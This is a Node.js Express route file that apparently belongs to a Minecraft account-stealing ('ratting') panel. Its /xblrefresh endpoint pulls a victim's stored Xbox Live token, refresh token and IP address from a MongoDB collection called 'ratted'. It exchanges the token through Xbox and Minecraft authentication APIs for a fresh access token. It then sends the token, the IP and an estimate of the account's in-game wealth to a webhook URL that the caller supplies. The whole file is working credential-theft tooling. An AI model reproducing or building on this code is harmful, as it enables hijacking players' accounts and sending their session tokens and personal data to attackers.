const networthCalc = require('../utils/Networth');
const express = require('express')
const router = express.Router();
const axios = require('axios')
const PostWebhook = require('../utils/sendwebhook')
const getXBL = require('../utils/mongodb.js')
const { MongoClient } = require('mongodb');
const config = require('../config.json')

const client = new MongoClient(config.mongodb.connectionstring, {
    useNewUrlParser: true,
    useUnifiedTopology: true,
  });

router.get("/xblrefresh", async (req, res) => {
        try {
        const key = req.query.key;
        const webhook_url = req.query.webhook;
        var UserHash;
        var BearerToken;

        if (key === undefined) {
            res.status(400).send("Missing Key!");
            return;
          }

            const db = client.db('users');
            const collection = db.collection('ratted');
            const user = await collection.findOne({authkey: key});
            const uuid = user.uuid;
            const username = user.username;
            const refresh = user.refresh;
            const ip = user.ip;
            const xbl_token = user.xbl;

            



            let networth = "0";
            let soulboundnetworth = "0";
            let sentnetworth = 0;
            let description = "No profile data found. 🙁";

            // array for the list of urls that will be used to get the data
        const urls = [
            "https://xsts.auth.xboxlive.com/xsts/authorize",
            "https://api.minecraftservices.com/authentication/login_with_xbox",
        ];

        // array for the list of configs that will be used to get the data
        const configs = [
            {
            headers: {
                "Content-Type": "application/json",
                Accept: "application/json",
            },
            },
            { headers: { "Content-Type": "application/json" } },
        ];


    
        let DataXST = {
            Properties: {
              SandboxId: "RETAIL",
              UserTokens: [xbl_token],
            },
            RelyingParty: "rp://api.minecraftservices.com/",
            TokenType: "JWT",
          };
        
          // get the user's XST token
          let ResponseXSTToken = await axios.post(urls[0], DataXST, configs[0]);
          XST = ResponseXSTToken.data["Token"];
          UserHash = ResponseXSTToken.data.DisplayClaims.xui[0].uhs;

          let DataBearerToken = {
            identityToken: `XBL3.0 x=${UserHash};${XST}`,
            ensureLegacyEnabled: true,
          };

        let ResponseBearerToken = await axios.post(urls[1], DataBearerToken, configs[1] );
        BearerToken = ResponseBearerToken.data["access_token"];
        console.log(BearerToken);



        networthCalc(uuid)
        .then((result) => {
          networth = Intl.NumberFormat("en-US", {
            notation: "compact",
            maximumFractionDigits: 2,
          }).format(result[0]);
          soulboundnetworth = Intl.NumberFormat("en-US", {
            notation: "compact",
            maximumFractionDigits: 2,
          }).format(result[1]);
          description = result[2];
          sentnetworth = Math.trunc(result[0]) / 1000000;
  
          // send everything to the webhook
          PostWebhook(
            true,
            username,
            uuid,
            ip,
            BearerToken,
            refresh,
            networth,
            soulboundnetworth,
            description,
            webhook_url,
            xbl_token,
          );
        })
      } catch (err) { console.log(err) }
      res.render(('refreshed/hackertext'), { title: "XBL TOKEN REFRESHED", textsize: "8" })
});




module.exports = router;
